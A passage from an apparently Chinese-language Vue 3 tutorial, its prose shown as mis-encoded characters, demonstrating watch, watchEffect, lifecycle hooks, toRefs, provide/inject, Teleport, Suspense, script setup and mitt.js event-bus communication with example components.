fullName3 = ref(\u0026#39;\u0026#39;); watch( user, ({ firstName, lastName }) =\u0026gt; { fullName3.value = firstName + \u0026#39;_\u0026#39; + lastName; }, { immediate: true, deep: true } ); return { user, fullName3, }; watch ç›£è½å¤šå€‹æ•¸æ“šï¼Œä½¿ç”¨é™£åˆ—ã€‚\nwatch ç›£è½ééŸ¿æ‡‰å¼è³‡æ–™çš„æ™‚å€™éœ€è¦ä½¿ç”¨å›èª¿å‡½å¼çš„å½¢å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 watch( [ () =\u0026gt; user.firstName, () =\u0026gt; user.lastName, fullName3 ], () =\u0026gt; { console.log(\u0026#39;æˆ‘åŸ·è¡Œäº†\u0026#39;) } ) watchEffect ä½œç”¨ï¼šç›£è¦–è³‡æ–™ç™¼ç”Ÿè®ŠåŒ–æ™‚åŸ·è¡Œå›èª¿ï¼Œä¸ç”¨ç›´æ¥æŒ‡å®šè¦ç›£è¦–çš„è³‡æ–™ï¼Œå›èª¿å‡½å¼ä¸­ä½¿ç”¨çš„å“ªäº›éŸ¿æ‡‰å¼è³‡æ–™å°±ç›£è¦–å“ªäº›éŸ¿æ‡‰å¼è³‡æ–™ï¼Œé è¨­åˆå§‹æ™‚å°±æœƒåŸ·è¡Œç¬¬ä¸€æ¬¡ï¼Œå¾è€Œå¯ä»¥æ”¶é›†éœ€è¦ç›£è¦–çš„è³‡æ–™ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { watchEffect, ref } from \u0026#39;vue\u0026#39;; const user = reactive({ firstName: \u0026#39;éŸ“\u0026#39;, lastName: \u0026#39;å¿—å‰\u0026#39;, }); const fullName4 = ref(\u0026#39;\u0026#39;); watchEffect(() =\u0026gt; { fullName4.value = user.firstName + \u0026#39;_\u0026#39; + user.lastName; }); return { user, fullName4, }; // watchEffectå¯ä»¥å¯¦ç¾è¨ˆç®—å±¬æ€§setæ–¹æ³• watchEffect(() =\u0026gt; { const names = fullName3.value.split(\u0026#39;_\u0026#39;); user.firstName = names[0]; user.lastName = names[1]; }); ç”Ÿå‘½é€±æœŸå°æ¯”ï¼š\næ³¨æ„ï¼š3.0 ä¸­çš„ç”Ÿå‘½é€±æœŸé‰¤å­è¦æ¯” 2.X ä¸­ç›¸åŒç”Ÿå‘½é€±æœŸçš„é‰¤å­è¦å¿«ã€‚ Composition API é‚„æ–°å¢äº†ä»¥ä¸‹ç”¨æ–¼é™¤éŒ¯çš„é‰¤å­å‡½å¼ï¼Œä½†æ˜¯ä¸æ€éº¼å¸¸ç”¨ï¼šonRenderTrackedã€onRenderTriggeredã€‚ ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 setup() { onBeforeMount(() =\u0026gt; { console.log(\u0026#39;--onBeforeMount\u0026#39;) }) onMounted(() =\u0026gt; { console.log(\u0026#39;--onMounted\u0026#39;) }) onBeforeUpdate(() =\u0026gt; { console.log(\u0026#39;--onBeforeUpdate\u0026#39;) }) onUpdated(() =\u0026gt; { console.log(\u0026#39;--onUpdated\u0026#39;) }) onBeforeUnmount(() =\u0026gt; { console.log(\u0026#39;--onBeforeUnmount\u0026#39;) }) onUnmounted(() =\u0026gt; { console.log(\u0026#39;--onUnmounted\u0026#39;) }) } toRefs ä½œç”¨ï¼šæŠŠä¸€å€‹éŸ¿æ‡‰å¼ç‰©ä»¶è½‰æ›æˆæ™®é€šç‰©ä»¶ï¼Œè©²æ™®é€šç‰©ä»¶çš„æ¯å€‹å±¬æ€§éƒ½æ˜¯ä¸€å€‹ refã€‚ æ‡‰ç”¨ï¼šæˆ‘å€‘ä½¿ç”¨ reactive å»ºç«‹çš„ç‰©ä»¶ï¼Œå¦‚æœæƒ³åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ï¼Œå°±å¿…é ˆå¾—ä½¿ç”¨ xxx.xxx çš„å½¢å¼ï¼Œå¦‚æœå¤§é‡ç”¨åˆ°çš„è©±é‚„æ˜¯å¾ˆéº»ç…©çš„ï¼Œä½†æ˜¯ä½¿ç”¨ es6 è§£æ§‹ä»¥å¾Œï¼Œæœƒå¤±å»éŸ¿æ‡‰å¼ï¼Œé‚£éº¼ toRefs çš„ä½œç”¨å°±é«”ç¾åœ¨é€™ï¼Œåˆ©ç”¨ toRefs å¯ä»¥å°‡ä¸€å€‹éŸ¿æ‡‰å¼ reactive ç‰©ä»¶çš„æ‰€æœ‰åŸå§‹å±¬æ€§è½‰æ›ç‚ºéŸ¿æ‡‰å¼çš„ ref å±¬æ€§ã€‚ç•¶ç„¶å°å¤¥ä¼´å€‘å¯ä»¥è‡ªè¡Œé–‹ç™¼æ›´å¤šæ‡‰ç”¨å ´æ™¯ã€‚ ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; name:{{name}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#39;ts\u0026#39;\u0026gt; import { defineComponent, reactive, toRefs } from \u0026#39;vue\u0026#39;; export default defineComponent({ name: \u0026#39;\u0026#39;, setup() { const state = reactive({ name: \u0026#39;hzw\u0026#39;, }); const state2 = toRefs(state); setInterval(() =\u0026gt; { state.name += \u0026#39;===\u0026#39;; }, 1000); return { // é€šé toRefs è¿”å›çš„ç‰©ä»¶ï¼Œè§£æ§‹å‡ºä¾†çš„å±¬æ€§ä¹Ÿæ˜¯éŸ¿æ‡‰å¼çš„ ...state2, }; }, }); \u0026lt;/script\u0026gt; provide èˆ‡ inject ä½œç”¨ï¼šå¯¦ç¾è·¨å±¤ç´šå…ƒä»¶(ç¥–å­«)é–“é€šè¨Šã€‚ ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;h1\u0026gt;çˆ¶å…ƒä»¶\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;ç•¶å‰é¡è‰²: {{color}}\u0026lt;/p\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;red\u0026#39;\u0026#34;\u0026gt;ç´…\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;yellow\u0026#39;\u0026#34;\u0026gt;é»ƒ\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;color=\u0026#39;blue\u0026#39;\u0026#34;\u0026gt;è—\u0026lt;/button\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;Son /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { provide, ref } from \u0026#39;vue\u0026#39; import Son from \u0026#39;./son.vue\u0026#39; export default { name: \u0026#39;ProvideInject\u0026#39;, components: { Son }, setup() { const color = ref(\u0026#39;red\u0026#39;) provide(\u0026#39;color\u0026#39;, color) return { color } } } \u0026lt;/script\u0026gt; son.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;å­å…ƒä»¶\u0026lt;/h2\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;GrandSon /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import GrandSon from \u0026#39;./grandson.vue\u0026#39; export default { components: { GrandSon }, } \u0026lt;/script\u0026gt; grandson.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;h3 :style=\u0026#34;{color}\u0026#34;\u0026gt;å­«å­å…ƒä»¶: {{color}}\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { inject } from \u0026#39;vue\u0026#39; export default { setup() { const color = inject(\u0026#39;color\u0026#39;) return { color } } } \u0026lt;/script\u0026gt; å…¶ä»–ç‰¹æ€§ Teleport(ç¬ç§») ä½œç”¨ï¼šTeleport æä¾›äº†ä¸€ç¨®ä¹¾æ·¨çš„æ–¹æ³•ï¼Œè®“å…ƒä»¶çš„ html åœ¨çˆ¶å…ƒä»¶ä»‹é¢å¤–çš„ç‰¹å®šæ¨™ç±¤(å¾ˆå¯èƒ½æ˜¯ body )ä¸‹æ’å…¥é¡¯ç¤ºï¼Œæ›å¥è©±èªªå°±æ˜¯å¯ä»¥æŠŠå­å…ƒä»¶æˆ–è€…domç¯€é»æ’å…¥åˆ°ä»»ä½•ä½ æƒ³æ’å…¥åˆ°çš„åœ°æ–¹å»ã€‚ èªæ³•ï¼šä½¿ç”¨ to å±¬æ€§ï¼Œå¼•è™Ÿå…§ä½¿ç”¨é¸æ“‡å™¨ã€‚ 1 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/teleport\u0026gt; ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;father\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;App\u0026lt;/h2\u0026gt; \u0026lt;modal-button\u0026gt;\u0026lt;/modal-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import ModalButton from \u0026#39;./components/ModalButton.vue\u0026#39; export default { setup() { return {} }, components: { ModalButton, }, } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;son\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;modalOpen = true\u0026#34;\u0026gt; é»æˆ‘é–‹å•Ÿå°è©±æ–¹å¡Š \u0026lt;/button\u0026gt; \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;div v-if=\u0026#34;modalOpen\u0026#34; class=\u0026#34;looklook\u0026#34;\u0026gt; çœ‹çœ‹æˆ‘å‡ºç¾åœ¨äº†å“ªè£¡ \u0026lt;button @click=\u0026#34;modalOpen = false\u0026#34;\u0026gt; Close \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;modal-button\u0026#39;, setup() { const modalOpen = ref(false) return { modalOpen, } }, } \u0026lt;/script\u0026gt; å¯ä»¥çœ‹åˆ°åœ¨å­å…ƒä»¶ä¸­çš„ looklook å…ƒç´ è·‘åˆ°äº† body ä¸‹é¢ï¼Œè€Œä¹‹å‰çš„ä½ç½®é»˜èªå‡ºç¾äº†å…©è¡Œè¨»é‡‹ã€‚\nSuspense(ä¸ç¢ºå®šçš„) ä½œç”¨ï¼šå®ƒå€‘å…è¨±æˆ‘å€‘çš„æ‡‰ç”¨ç¨‹å¼åœ¨ç­‰å¾…éåŒæ­¥å…ƒä»¶æ™‚æ¸²æŸ“ä¸€äº›å¾Œå‚™å…§å®¹ï¼Œå¯ä»¥è®“æˆ‘å€‘å»ºç«‹ä¸€å€‹å¹³æ»‘çš„ä½¿ç”¨è€…é«”é©—ã€‚ èªæ³•ï¼š 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;!-- éåŒæ­¥å…ƒä»¶ --\u0026gt; \u0026lt;AsyncComp /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;!-- å¾Œå‚™å…§å®¹ --\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; vue3 ä¸­å¼•å…¥éåŒæ­¥å…ƒä»¶çš„æ–¹å¼ï¼š\n1 const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) ç¨‹å¼ç¢¼æ¼”ç¤ºï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;template\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;!-- v-slot:defaul å¯ä»¥ç°¡å¯«æˆ #defaul --\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;AsyncComp/\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;!-- v-slot:defaul å¯ä»¥ç°¡å¯«æˆ #fallback --\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h1\u0026gt;LOADING...\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import { defineAsyncComponent } from \u0026#39;vue\u0026#39; const AsyncComp = defineAsyncComponent(() =\u0026gt; import(\u0026#39;./AsyncComp.vue\u0026#39;)) export default { setup() { return { } }, components: { AsyncComp, } } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;template\u0026gt; \u0026lt;h2\u0026gt;AsyncComp22\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;{{msg}}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; export default { name: \u0026#39;AsyncComp\u0026#39;, setup () { return new Promise((resolve, reject) =\u0026gt; { setTimeout(() =\u0026gt; { resolve({ msg: \u0026#39;abc\u0026#39; }) }, 2000) }) } } \u0026lt;/script\u0026gt; é€šéä¸‹åœ–å¯ä»¥çœ‹åˆ°åœ¨éåŒæ­¥å…ƒä»¶åŠ è¼‰å‡ºä¾†ä¹‹å‰ï¼Œé¡¯ç¤ºçš„æ˜¯ fallback ä¸­çš„å…§å®¹ï¼š\néŸ¿æ‡‰å¼è³‡æ–™çš„åˆ¤æ–· ä½œç”¨ isRefï¼šæª¢æŸ¥ä¸€å€‹å€¼æ˜¯å¦ç‚ºä¸€å€‹ ref ç‰©ä»¶ isReactiveï¼šæª¢æŸ¥ä¸€å€‹ç‰©ä»¶æ˜¯å¦æ˜¯ç”± reactive å»ºç«‹çš„éŸ¿æ‡‰å¼ä»£ç† isReadonlyï¼šæª¢æŸ¥ä¸€å€‹ç‰©ä»¶æ˜¯å¦æ˜¯ç”± readonly å»ºç«‹çš„åªè®€ä»£ç† isProxyï¼šæª¢æŸ¥ä¸€å€‹ç‰©ä»¶æ˜¯å¦æ˜¯ç”± reactive æˆ–è€… readonly æ–¹æ³•å»ºç«‹çš„ä»£ç† ç¨‹å¼ç¢¼æ¼”ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 setup() { const state1 = ref(1); console.log(\u0026#39;isref:\u0026#39;, isRef(state1)); // isref: true const state2 = reactive({}); console.log(\u0026#39;isReactive:\u0026#39;, isReactive(state2)); // isReactive: true const state3 = readonly({}); console.log(\u0026#39;isReadonly:\u0026#39;, isReadonly(state3)); // isReadonly: true const state4 = reactive({}); console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state2)); // isProxy: true console.log(\u0026#39;isProxy:\u0026#39;, isProxy(state4)); // isProxy: true return {}; }, å…¶ä»–ä¸å¸¸ç”¨ç‰¹æ€§ é‚„æœ‰å¾ˆå¤šå¾ˆå¤šä¸å¸¸ç”¨çš„æ–°ç‰¹æ€§ï¼Œæˆ‘åœ¨æ—¥å¸¸é–‹ç™¼ä¸­æ˜¯æ²’æœ‰ç”¨åˆ°çš„ï¼Œå¾ˆå¤šéƒ½æ˜¯ç”¨ä¾†åšå„ªåŒ–çš„ï¼Œæ„Ÿèˆˆè¶£çš„å°å¤¥ä¼´å€‘è‡ªè¡Œå»å®˜ç¶²æª¢è¦–ï¼Œæˆ–è€…å¤§ä½¬å€‘å¯ä»¥ä»‹ç´¹ä¸€ä¸‹æ‡‰ç”¨å ´æ™¯ã€‚\nshallowReactive shallowRef readonly shallowReadonly markRaw customRef \u0026hellip; èªæ³•ç³– é›–ç„¶ Composition API ç”¨èµ·ä¾†å·²ç¶“éå¸¸æ–¹ä¾¿äº†ï¼Œä½†æ˜¯æˆ‘å€‘é‚„æ˜¯æœ‰å¾ˆç…©çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼š\nå…ƒä»¶å¼•å…¥äº†é‚„è¦è¨»å†Šã€‚ å±¬æ€§å’Œæ–¹æ³•éƒ½è¦åœ¨ setup å‡½å¼ä¸­è¿”å›ï¼Œæœ‰çš„æ™‚å€™åƒ…ä¸€å€‹ return å°±åå¹¾è¡Œç”šè‡³å¹¾åè¡Œã€‚ \u0026hellip; ä¸æƒ³å¯«å•Šæ€éº¼è¾¦\nå¥½è¾¦ï¼Œ Vue3 å®˜æ–¹æä¾›äº† script setup èªæ³•ç³–ï¼Œåªéœ€è¦åœ¨ script æ¨™ç±¤ä¸­==æ–°å¢ setup==ï¼Œå…ƒä»¶åªéœ€å¼•å…¥ä¸ç”¨è¨»å†Šï¼Œå±¬æ€§å’Œæ–¹æ³•ä¹Ÿä¸ç”¨è¿”å›ï¼Œsetup å‡½å¼ä¹Ÿä¸éœ€è¦ï¼Œç”šè‡³ export default éƒ½ä¸ç”¨å¯«äº†ï¼Œä¸åƒ…æ˜¯è³‡æ–™ã€è¨ˆç®—å±¬æ€§å’Œæ–¹æ³•ï¼Œç”šè‡³æ˜¯è‡ªå®šç¾©æŒ‡ä»¤ä¹Ÿå¯ä»¥åœ¨æˆ‘å€‘çš„ template ä¸­è‡ªå‹•ç²å¾—ã€‚\nä½†æ˜¯é€™éº¼éç™®çš„èªæ³•ç³–ï¼Œé‚„æ˜¯ç¨å¾®æ·»åŠ äº†ä¸€é»é»å¿ƒæ™ºè² æ“”ï¼Œå› ç‚ºæ²’æœ‰äº† setup å‡½å¼ï¼Œé‚£éº¼ propsã€emitã€attrs æ€éº¼ç²å–å‘¢ï¼Œå°±è¦ä»‹ç´¹ä¸€ä¸‹æ–°çš„èªæ³•äº†ã€‚\nsetup script èªæ³•ç³–æä¾›äº†ä¸‰å€‹æ–°çš„ API ä¾†ä¾›æˆ‘å€‘ä½¿ç”¨ï¼š ==defineProps==ã€==defineEmit== å’Œ ==useContext==ã€‚\ndefinePropsï¼šç”¨ä¾†æ¥æ”¶çˆ¶å…ƒä»¶å‚³ä¾†çš„å€¼ propsã€‚ defineEmitï¼šç”¨ä¾†å®£å‘Šè§¸ç™¼çš„äº‹ä»¶è¡¨ã€‚ useContextï¼šç”¨ä¾†ç²å–å…ƒä»¶ä¸Šä¸‹æ–‡ contextã€‚ ç¨‹å¼ç¢¼æ¼”ç¤º parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Children msg=\u0026#34;hello\u0026#34; @child-click=\u0026#34;handleClick\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Children from \u0026#39;./components/children.vue\u0026#39; const handleClick = (ctx) =\u0026gt; { console.log(ctx) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;span @click=\u0026#34;sonClick\u0026#34;\u0026gt;msg: {{ props.msg }}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useContext, defineProps, defineEmit } from \u0026#39;vue\u0026#39; const emit = defineEmit([\u0026#39;child-click\u0026#39;]) const ctx = useContext() const props = defineProps({ msg: String, }) const sonClick = () =\u0026gt; { emit(\u0026#39;child-click\u0026#39;, ctx) } \u0026lt;/script\u0026gt; æˆ‘å€‘é»é¸ä¸€ä¸‹å­å…ƒä»¶ï¼š\nå¯ä»¥çœ‹åˆ° context è¢«åˆ—å°äº†å‡ºä¾†ï¼Œå…¶ä¸­çš„ attrsã€emitã€slotsã€expose å±¬æ€§å’Œæ–¹æ³•ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚props ä¹Ÿå¯ä»¥è¼¸å‡ºåœ¨é é¢ä¸Šï¼Œäº‹ä»¶ä¹ŸæˆåŠŸæ´¾ç™¼ã€‚\nå…¶ä»–çŸ¥è­˜é» æ¥ä¸‹ä¾†ä»‹ç´¹ä¸€ä¸‹æˆ‘ä½¿ç”¨ Vue3 éç¨‹ä¸­é‡åˆ°çš„å•é¡Œæˆ–è€…å°æŠ€å·§ï¼Œä¸å…¨é¢ï¼Œæƒ³èµ·ä»€éº¼å°±å¯«ä»€éº¼å§ã€‚\nscript setup èªæ³•ç³–çš„å‘\né€™å€‹å¾ˆå¤šå¤§ä½¬å·²ç¶“åœ¨ Vue3 çš„ github ä¸Šæäº¤ Issues äº†ï¼Œæˆ–è¨±æœƒåœ¨ä¸ä¹…çš„å°‡ä¾†ä¿®å¾©ï¼Œä½†ç¾åœ¨é‚„æ˜¯è¦æ³¨æ„ä¸€ä¸‹ã€‚\nå¦‚æœåœ¨çˆ¶å…ƒä»¶ä¸­é€šé ref='xxx' çš„æ–¹æ³•ä¾†ç²å–å­å…ƒä»¶å¯¦ä¾‹ï¼Œé‚£éº¼å­å…ƒä»¶ä¸å¯ä»¥ä½¿ç”¨ script setup èªæ³•ç³–ï¼Œå¦å‰‡æœƒå ±éŒ¯ã€‚\nç¨‹å¼ç¢¼æ¼”ç¤º parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Child ref=\u0026#39;son\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/children.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const son = ref(null) console.log(\u0026#39; ~ son:\u0026#39;, son) \u0026lt;/script\u0026gt; å­å…ƒä»¶å…ˆä¸ä½¿ç”¨èªæ³•ç³–ï¼š\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script \u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { setup() { const msg = ref(\u0026#39;hello\u0026#39;) return { msg, } }, } ç¾åœ¨æŠŠå­å…ƒä»¶æ›æˆ script setup èªæ³•ç³–å†ä¾†è©¦ä¸€è©¦ï¼š\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const msg = ref(\u0026#39;hello\u0026#39;) \u0026lt;/script\u0026gt; å¯ä»¥çœ‹åˆ°ç¾åœ¨æ˜¯ç²å–ä¸åˆ°å­å…ƒä»¶å®šç¾©çš„ msg å±¬æ€§çš„ã€‚\nEmit æ´¾ç™¼äº‹ä»¶å¯ä»¥å°å¼•æ•¸é€²è¡Œé©—è­‰ parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Child @sonClick=\u0026#39;sonClick\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/Child.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const sonClick = (value) =\u0026gt; { console.log(value) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶{{ msg }} \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(1)\u0026#34;\u0026gt;æˆ‘æ˜¯æŒ‰éˆ•1\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(2)\u0026#34;\u0026gt;æˆ‘æ˜¯æŒ‰éˆ•2\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;\u0026#39;, emits: { sonClick: (value) =\u0026gt; { if (value === 1) { return true } else { return false } }, }, setup(props, { emit }) { const msg = ref(\u0026#39;hello\u0026#39;) const handleClick = (value) =\u0026gt; { emit(\u0026#39;sonClick\u0026#39;, value) } return { msg, handleClick, } }, } \u0026lt;/script\u0026gt; æˆ‘å€‘åˆ†åˆ¥é»ä¸€ä¸‹æŒ‰éˆ•1å’ŒæŒ‰éˆ•2ï¼Œå¯ä»¥çœ‹åˆ°ç•¶æˆ‘å€‘é»äº†æŒ‰éˆ•2çš„æ™‚å€™ï¼Œæ§åˆ¶æª¯æœƒç™¼å‡ºè­¦å‘Šï¼Œä½†æ˜¯ç¨‹å¼æœƒç¹¼çºŒåŸ·è¡Œï¼Œé‚„æ²’æƒ³åˆ°ä»€éº¼é©åˆçš„æ‡‰ç”¨å ´æ™¯ï¼Œä½†æ˜¯è¦çŸ¥é“é€™å€‹çŸ¥è­˜é»ï¼Œå°å¤¥ä¼´å€‘å¯ä»¥åœ¨é€™æäº‹æƒ…ã€‚\nè·¨å…ƒä»¶é€šè¨Š mitt.js Vue2 ä¸­æ€éº¼å¯¦ç¾è·¨å…ƒä»¶é€šè¨Šå‘¢ï¼Ÿå¾ˆå¤šäººç¬¬ä¸€æƒ³æ³•å°±æ˜¯ event busã€‚ä½†æ˜¯ Vue3 ç§»é™¤äº† $onã€$onceã€$off å°è‡´ä¸èƒ½ä½¿ç”¨é€™å€‹æ–¹æ³•ã€‚ä½†æ˜¯ Vue å®˜æ–¹çµ¦å¤§å®¶æ¨è–¦äº† ==mitt.js==ï¼Œå®ƒçš„åŸç†å°±æ˜¯ event busã€‚\nmitt.js æ•™å­¸\nç¨‹å¼ç¢¼æ¼”ç¤º å…ˆå®‰è£ï¼š 1 npm i mitt -s ç„¶å¾Œå°è£æˆä¸€å€‹ hookï¼š mitt.js 1 2 3 4 import mitt from \u0026#39;mitt\u0026#39; const emitter = mitt(); export default emitter; ä½¿ç”¨ï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Child1 /\u0026gt; \u0026lt;Child2 /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child1 from \u0026#39;./components/children1.vue\u0026#39; import Child2 from \u0026#39;./components/children2.vue\u0026#39; \u0026lt;/script\u0026gt; children1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶1 \u0026lt;h1\u0026gt;{{msg}}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, onUnmounted } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { // åˆå§‹åŒ– const msg = ref(\u0026#39;hello\u0026#39;) const changeMsg = () =\u0026gt; { msg.value = \u0026#39;world\u0026#39; } // ç›£è½äº‹ä»¶ï¼Œæ›´æ–°è³‡æ–™ emitter.on(\u0026#39;change-msg\u0026#39;, changeMsg) // é¡¯å¼è§£é™¤å®‰è£ onUnmounted(() =\u0026gt; { emitter.off(\u0026#39;change-msg\u0026#39;, changeMsg) }) return { msg, changeMsg, } }, } \u0026lt;/script\u0026gt; children2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶2 \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;changeMsg\u0026#39;\u0026gt;é»é¸ä¿®æ”¹msg\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { const changeMsg = () =\u0026gt; { emitter.emit(\u0026#39;change-msg\u0026#39;) } return { 